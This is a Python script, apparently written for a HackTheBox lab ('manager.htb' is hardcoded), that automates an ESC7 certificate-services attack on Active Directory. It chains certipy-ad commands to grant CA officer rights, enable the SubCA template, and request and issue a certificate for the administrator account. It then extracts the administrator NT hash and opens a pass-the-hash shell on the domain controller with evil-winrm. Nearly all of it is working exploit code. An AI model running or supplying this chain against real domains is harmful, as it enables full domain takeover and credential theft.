import subprocess
import argparse
import re
import os



def extract_request_id(output):
    print(output)
    match = re.search(r'Request ID is (\d+)', output)
    if match:
        return match.group(1)
    return None

def create_officer(args):
    print("[*] Trying to get CA manager role")
    command = f"certipy-ad ca -ca '{args.ca}' -add-officer raven -username {args.username}@{args.domain} -password '{args.password}' -target {args.dc_ip}"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    match = re.search(r'Successfully|already has officer rights', str(output))
    print(output.stdout)
    if match:
        print("[*] Succesful !")
    else:
        print("[*] Unsuccesful to get CA manager role, exiting...")
        exit(1)

def enable_template(args):
    print("[*] Trying to enable SubCA template (vulnerable to ESC7)")
    command = f"certipy-ad ca -ca '{args.ca}' -enable-template SubCA -username {args.username}@{args.domain} -password '{args.password}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    match = re.search(r'Successfully enabled', str(output))
    print(output.stdout)
    if match:
        print("[*] Succesful !")
    else:
        print("[*] Unsuccesful to enable SubCA template, exiting...")
        exit(1)
def request_certificate(args):
    command = f"certipy-ad req -username '{args.username}@{args.domain}' -password '{args.password}' -ca {args.ca} -target {args.domain} -template SubCA -upn administrator@{args.domain}"
    print(command)

    # Attendre l'entrée utilisateur avant d'exécuter la commande
    input("Enter Y is you want to save the request. N if not. TBF it's useless\n\n")

    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    request_id = extract_request_id(output.stdout)
    print("[*] Request succesful, request id is " + request_id)
    return request_id

def issue_certificate(args, request_id):
    print("[*] Issuing certificate")
    command = f"certipy-ad ca -ca '{args.ca}' -issue-request {request_id} -username {args.username}@{args.domain} -password '{args.password}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

def retrieve_certificate(args, request_id):
    print("[*] Retrieving and downloading certificate")
    command = f"certipy-ad req -username {args.username}@{args.domain} -password '{args.password}' -ca {args.ca} -target manager.htb -retrieve {request_id}"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

def sync_time():
    print("[*] Sync time to ask TGT")
    command = f"sudo ntpdate {args.domain}"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)

def authenticate_with_pfx(args):
    print("[*] Asking TGT and hash of administrator")
    command = f"/usr/bin/certipy-ad auth -pfx ./administrator.pfx -dc-ip '{args.dc_ip}' -username 'administrator' -domain '{args.domain}'"
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    spawn_evilwinrm(output)
    
    
def spawn_evilwinrm(output):
    print("[*] Connecting to DC using administrator hash")
    hash_regex = r"\[\*\] Got hash for 'administrator@[^\s]+': ([a-f0-9]{32}):([a-f0-9]{32})"
    match = re.search(hash_regex, output.stdout)
    if match:
        command = f"evil-winrm -i {args.dc_ip} -u administrator@{args.domain} -H {match.group(2)}"
        os.system(command)
    return None
    
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script pour automatiser les commandes Certipy.")
    parser.add_argument("-ca", type=str, help="Nom de l'autorité de certification (CA)")
    parser.add_argument("-username", type=str, help="Nom d'utilisateur")
    parser.add_argument("-password", type=str, help="Mot de passe")
    parser.add_argument("-dc_ip", type=str, help="Adresse IP du contrôleur de domaine")
    parser.add_argument("-domain", type=str, help="Nom de domaine")

    args = parser.parse_args()
    create_officer(args)
    enable_template(args)
    request_id = request_certificate(args)
    if request_id:
        issue_certificate(args, request_id)
        retrieve_certificate(args, request_id)
        sync_time()
        authenticate_with_pfx(args)
    else:
        print("Échec de la récupération de l'ID de requête. Veuillez vérifier la sortie de la commande de demande de certificat.")
        